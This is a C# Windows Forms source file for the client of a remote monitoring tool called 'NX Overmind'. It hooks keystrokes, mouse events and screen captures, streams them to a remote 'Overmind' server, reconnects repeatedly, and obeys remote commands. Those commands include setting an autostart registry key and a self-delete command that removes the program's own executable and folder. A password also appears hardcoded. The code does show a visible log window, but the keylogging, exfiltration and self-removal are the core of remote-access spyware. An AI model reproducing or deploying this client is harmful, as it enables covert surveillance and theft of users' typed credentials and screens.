﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

using NX.Hooks;
using NX.Collections;
using NX.Net;
using NX.Log.NeuroLog;

using NX_Overmind.Actions;

namespace NX_Overmind
{
    public partial class ClientForm : Form
    {
        /**
         * Communicated Parameters
         * 
         */
        public enum ClientTransferType : byte
        {
            RemoteSupport = 0x01,
            Streaming = 0x02,
            // Till 0x0F (15 types)
            NoScreenCapture = 0x20,
            EventLogging = 0xC0,
            KeyEventLogging = 0x80,
            MouseEventLogging = 0x40
        }
        
        private string _paramAddress;
        private int _paramSocket;
        private ClientTransferType _paramType;
        private string _paramName;


        /**
         * Other vars
         * 
         */ 
        private TcpClient _client = null;
        
        private ActionCenter _actionCenter = null;
        private LogQueue<byte[]> _logQueue = null;
        private KeyCapture _kc = null;
        private MouseCapture _mc = null;
        private ScreenCapture _sc = null;
        private bool _onceStartedHook = false;

        private OvermindLogManager _neuroLog = new OvermindLogManager("NeuroLog", OvermindLogManager.LogEntryType.App_Client);

        public ClientForm()
        {
            InitializeComponent();               
        }

        public ClientForm(string addr, int socket, ClientTransferType type, int captureInterval, string clientName)
            : this()
        {
            this._paramAddress = addr;
            this._paramSocket = socket;
            this._paramType = type;
            this._paramName = clientName;

            this._neuroLog.Write("Initializing TCP instance");
            this._client = new TcpClient();

            this._client.OnDataReceived += new TcpClient.ClientStatusEventHandler(_client_OnDataReceived);
            this._client.OnConnectionSuccess += new TcpClient.ClientStatusEventHandler(_client_OnConnectionSuccess);
            this._client.OnError += new TcpClient.ClientStatusEventHandler(_client_OnError);
            this._client.OnStatusChanged += new TcpClient.ClientStatusEventHandler(_client_OnStatusChanged);
            this._client.OnDisconnect += new TcpClient.ClientStatusEventHandler(_client_OnDisconnect);

            this._neuroLog.Write("Connection Timer", "Enabled");
            this.connTimer.Enabled = true;

            this._neuroLog.Write("Initializing Action Center", "7z Password: l*lk0d3");
            this._actionCenter = new ActionCenter("l*l7k0d3");
            this._actionCenter.SendData += new ActionCenter.ActionCenterEventHandler(_actionCenter_SendData);
            this._actionCenter.ReceiveAppCommand += new ActionCenter.ActionCenterInternalEventHandler(_actionCenter_ReceiveAppCommand);
            this._actionCenter.CaptureManagerModule.DebugEvent += new ActionCenter.DebugEventHandler(_actionCenter_DebugEvent);
            this._actionCenter.CaptureManagerModule.CaptureShrinkFactor = 0.4f;
            this._actionCenter.CaptureManagerModule.CaptureInterval = captureInterval;
            this._actionCenter.CaptureManagerModule.CaptureBufferCount = 20;

            this._neuroLog.Write("Initializing Capture Modules");
            this._logQueue = new LogQueue<byte[]>();
            this._sc = new ScreenCapture();
            this._sc.CursorChanged += new ScreenCapture.ScreenUpdateEvent(_sc_CursorChanged);
            this._kc = new KeyCapture(this._logQueue);
            this._mc = new MouseCapture(this._logQueue);

            this.captureTimer.Interval = this._actionCenter.CaptureManagerModule.CaptureInterval;
            
            string __tempLog = "";
            if ((this._paramType & ClientTransferType.NoScreenCapture) != ClientTransferType.NoScreenCapture)
            {
                __tempLog = "Enable Screen Capture\n";
                this.screenToolStripMenuItem.Checked = true;            
            }
            
            if ((this._paramType & ClientTransferType.KeyEventLogging) == ClientTransferType.KeyEventLogging)
            {
                __tempLog += "Enable Key Logging\n";
                this.keyEventsToolStripMenuItem.Checked = true;
            }
            
            if ((this._paramType & ClientTransferType.MouseEventLogging) == ClientTransferType.MouseEventLogging)
            {
                __tempLog += "Enable Mouse Capture";
                this.mouseEventsToolStripMenuItem.Checked = true;
            }
            this._neuroLog.Write("Initializing Toolstrip Checkboxes", __tempLog);
            
            //this._sc.Start();            
            // Do not start capture timer till connection is made.
        }

        void _sc_CursorChanged(IntPtr hCursor)
        {
            this._actionCenter.CaptureManagerModule.EncodeCaptureCursor(0, hCursor);            
        }        

        private void StartHooks()
        {
            if (this.screenToolStripMenuItem.Checked)
            {
                this._neuroLog.Write("Starting Screen Capture");
                this._sc.Start();
            }
            if (this.keyEventsToolStripMenuItem.Checked)
            {
                this._neuroLog.Write("Starting Key Capture");
                this._kc.Start();
            }
            if (this.mouseEventsToolStripMenuItem.Checked)
            {
                this._neuroLog.Write("Starting Mouse Capture");
                this._mc.Start();
            }
        }

        private void UpdateTerminal(Color c, object obj)
        {
            try
            {                                    
                if (obj is NetEventArgs)
                {
                    NetEventArgs e = obj as NetEventArgs;
                    if (e.Message != null)
                        this.textLog.TerminalAppendLine(e.Message, c);                    
                }
                else if (obj is String)                           
                    this.textLog.TerminalAppendLine(obj as string, c);                
            }
            catch (Exception) { }
        }        

        void _client_OnDisconnect(object sender, NetEventArgs e)
        {
            this._neuroLog.Write("Tcp Message", "Disconnected, " + e.Message);
            this.UpdateTerminal(Color.Red, "[C]: Disconnected, " + e.Message);
        }

        void _client_OnDataReceived(object sender, NetEventArgs e)
        {
            this._neuroLog.WriteFormat("Tcp Message", "Data Received\nType: {0}\nData:\n{1}", e.Packet.Header.Type, e.Packet.Data);
            switch (e.Packet.Header.Type)
            {
                case NetPacket.PacketType.Print:                    
                    this.UpdateTerminal(Color.AliceBlue, "[" + this._client.GetSenderName(e.Packet) + "]: Data received, " + UTF8Encoding.UTF8.GetString(e.Packet.Data));
                    break;
                case NetPacket.PacketType.Custom:
                    this._actionCenter.InitiateAction(e.Packet.Header.Source, e.Packet.Data);
                    break;
                default:
                    this.UpdateTerminal(Color.AliceBlue, "[" + this._client.GetSenderName(e.Packet) + "]: Data received. Period.");
                    break;
            }
        }

        void _client_OnStatusChanged(object sender, NetEventArgs e)
        {
            this._neuroLog.WriteFormat("Tcp Message", "Status Changed.\n{0}", e.Message);
            this.UpdateTerminal(Color.YellowGreen, "[C]: Client Status, " + e.Message);               
        }

        void _client_OnError(object sender, NetEventArgs e)
        {
            this._neuroLog.WriteFormat("Tcp Message", "Error.\nMessage: {0}\n\nStack Trace:\n", e.Exception.Message, e.Exception.StackTrace);
            this.UpdateTerminal(Color.OrangeRed, "[C]: Error, " + e.Exception.Message);
            if (!this._client.Connected)
            {
                this.connTimer.Interval = (int)Math.Exp(this.e_power);//(int)(this.connTimer.Interval * 1.5f);
                this.e_power += 0.2;
                try
                {
                    this.BeginInvoke(new MethodInvoker(delegate { this.connTimer.Enabled = true; }));
                }
                catch (Exception) { }
            }
        }

        void _client_OnConnectionSuccess(object sender, NetEventArgs e)
        {
            this._neuroLog.Write("Tcp Message", "Connection Success");
            this.UpdateTerminal(Color.Green, "[C]: Connected to Overmind.");
            this.connTimer.Interval = 5000;            
            this.UpdateTerminal(Color.PaleTurquoise, string.Format("[C]: Sending name change request as {0}'", this._paramName));
            this._neuroLog.WriteFormat("Tcp Write", "PacketType: Command\nTcpCommand: Name\nName: {0}", this._paramName);
            this._client.BeginWriteToClient(0, NetPacket.PacketType.Command, new TcpCommand(TcpCommand.Command.Name, UTF8Encoding.UTF8.GetBytes(this._paramName)).Serialize());
            // Start Hooks
            if (this._onceStartedHook == false)
            {
                this._onceStartedHook = true;
                this.BeginInvoke(new MethodInvoker(delegate { this.StartHooks(); this.captureTimer.Enabled = true; }));
            }
        }

        void _actionCenter_ReceiveAppCommand(int id, ActionCenter.ActionType type, byte[] data)
        {
            if (this.InvokeRequired)
                this.BeginInvoke((MethodInvoker)delegate { this._actionCenter_ReceiveAppCommand(id, type, data); });
            else
            {
                this._neuroLog.Write("Received App Command", type.ToString());
                switch (type)
                {
                    case ActionCenter.ActionType.AppAutoStart:                        
                        try
                        {
                            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\NX\\Overmind");
                            rk.SetValue("AutoStart", "true");
                            rk.Close();
                        }
                        catch (Exception) { }
                        break;
                    case ActionCenter.ActionType.AppAutoStop:
                        try
                        {
                            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\NX\\Overmind");
                            rk.SetValue("AutoStart", "false");
                            rk.Close();
                        }
                        catch (Exception) { }
                        break;
                    case ActionCenter.ActionType.AppDie:
                        // Stop Captures
                        this._sc.Stop();
                        this._kc.Stop();
                        this._mc.Stop();
                        this.captureTimer.Enabled = false;
                        // Remove AutoStarts
                        try
                        {
                            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\NX\\Overmind");
                            rk.SetValue("AutoStart", "false");
                            rk.Close();
                        }
                        catch (Exception) { }
                        // Delete Files
                        File.Delete(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
                        Directory.Delete(Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName), true);
                        // Quit Application
                        this.Close();
                        break;
                    case ActionCenter.ActionType.AppPause:
                        this._sc.Stop();
                        this._kc.Stop();
                        this._mc.Stop();
                        this.captureTimer.Enabled = false;
                        break;
                    case ActionCenter.ActionType.AppStart:
                        this._sc.Start();
                        this._kc.Start();
                        this._mc.Start();
                        this.captureTimer.Enabled = true;
                        break;
                    case ActionCenter.ActionType.AppStop:
                        this._sc.Stop();
                        this._kc.Stop();
                        this._mc.Stop();
                        this.captureTimer.Enabled = false;
                        this.Close();
                        break;
                }     
            }
        }

        void _actionCenter_SendData(int id, byte[] data)
        {            
            if (this._client.Connected && this._client.Acknowledged)
            {
                this._neuroLog.WriteFormat("Sending Data", "Data:\n{0}", data);
                this.UpdateTerminal(Color.Crimson, "[C]: Sending data to Overmind.");
                this._client.BeginWriteToClient(id, NetPacket.PacketType.Custom, data);                
                //this.captureTimer.Enabled = false;
            }
        }

        private void _actionCenter_DebugEvent(string message)
        {
            this.UpdateTerminal(Color.OrangeRed, message);
        }

        private void captureTimer_Tick(object sender, EventArgs e)
        {
            Bitmap bmp = (this._sc != null? this._sc.ProcessLog(): null);   // Check if screen capture is present
            (new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(this.DispatchCapture))).Start(bmp);
        }

        private void DispatchCapture(object obj)
        {
            Bitmap bmp = obj as Bitmap;
            MemoryStream ls = new MemoryStream();
            lock (this._logQueue)
            {
                foreach (byte[] b in this._logQueue.Flush())
                    ls.Write(b, 0, b.Length);
            }
            

            if (ls.Length != 0 || bmp != null)
            {
                //this.UpdateTerminal(Color.PaleTurquoise, "[*]: Packing Capture");
                //OctreeQuantizer oq = new OctreeQuantizer(this._actionCenter.CaptureManagerModule.CaptureQuantizePalette, this._actionCenter.CaptureManagerModule.CaptureQuantizeDepth);
                //bmp = oq.Quantize(ScreenSnap.ShrinkBitmap(bmp, this._actionCenter.CaptureManagerModule.CaptureShrinkFactor));
                //this._actionCenter.InitiateAction(this.id
                this._neuroLog.WriteFormat("Encode Capture", "Bitmap: {0}, Event Log: {1}", (bmp != null).ToString(), ls.Length);
                this._actionCenter.CaptureManagerModule.EncodeCapture(0,                                                // Server
                    bmp, ls,                                                                                            // Screen and Log stream
                    //new CapturePacket(ScreenSnap.SnapshotToStream(bmp, System.Drawing.Imaging.ImageFormat.Png), ls),    // Packet
                    ((this._paramType & ClientTransferType.RemoteSupport) == ClientTransferType.RemoteSupport));        // Is Live?
            }
        }

        private double e_power = 7;
        private void connTimer_Tick(object sender, EventArgs e)
        {                        
            this.connTimer.Enabled = false;
            this._client.Connect(this._paramAddress, this._paramSocket);
            this._neuroLog.WriteFormat("Connection Timer", "Attempting to reach Overmind at {0}:{1}. Next attempt in {2}s\nConnection Type: {1}\nCapture Interval: {1}ms\nEvent Logging: {2}", 
                this._paramAddress, this._paramSocket, (this.connTimer.Interval / 1000), ((ClientTransferType)((byte)this._paramType & 0x7F)), this.captureTimer.Interval, ((byte)this._paramType & 0x80) == 0x80 ? "Enabled" : "Disabled");

            this.UpdateTerminal(Color.PaleTurquoise, string.Format("[C]: Attempting to reach Overmind at {0}:{1}. Next attempt in {2}s", this._paramAddress, this._paramSocket, (this.connTimer.Interval / 1000)));
            this.UpdateTerminal(Color.PaleTurquoise, string.Format("[C]: Connection type '{0}'  every {1}ms; Event Logging {2}", ((ClientTransferType)((byte)this._paramType & 0x7F)), this.captureTimer.Interval, ((byte)this._paramType & 0x80) == 0x80 ? "Enabled" : "Disabled"));
        }

        private void ClientForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this._neuroLog.Write("Form Closing");
            this.stopToolStripMenuItem_Click(sender, e);
        }

        private void checkBox_CheckCaptureEventChanged(object sender, EventArgs e)
        {
            ToolStripMenuItem cb = sender as ToolStripMenuItem;
            if (this._client.Connected)
            {
                if (cb == this.screenToolStripMenuItem)
                {
                    if (cb.Checked)
                    {
                        this._sc.Start();
                        this._neuroLog.Write("Checkbox Event", "Screen Capture Start");
                    }
                    else
                    {
                        this._sc.Stop();
                        this._neuroLog.Write("Checkbox Event", "Screen Capture Stop");
                    }
                }
                else if (cb == this.keyEventsToolStripMenuItem)
                {
                    if (cb.Checked)
                    {
                        this._kc.Start();
                        this._neuroLog.Write("Checkbox Event", "Key Capture Start");
                    }
                    else
                    {
                        this._kc.Stop();
                        this._neuroLog.Write("Checkbox Event", "Key Capture Stop");
                    }
                }
                else if (cb == this.mouseEventsToolStripMenuItem)
                {
                    if (cb.Checked)
                    {
                        this._mc.Start();
                        this._neuroLog.Write("Checkbox Event", "Mouse Capture Start");
                    }
                    else
                    {
                        this._mc.Stop();
                        this._neuroLog.Write("Checkbox Event", "Mouse Capture Stop");
                    }
                }
            }
        }

        private void saveLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.saveFileDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                File.WriteAllText(this.saveFileDialog.FileName, this.textLog.Text);
                this._neuroLog.Write("Log Flushed", this.saveFileDialog.FileName);
            }
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this._neuroLog.Write("Form Closing");
            this.Close();
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                this._client.Disconnect("Client Closing.");
                this._neuroLog.Write("Client Disconnected");
            }
            catch (Exception ex)
            {
                this._neuroLog.Write("Failed Client Disconnecting", ex.Message);
            }
        }        
    }
}
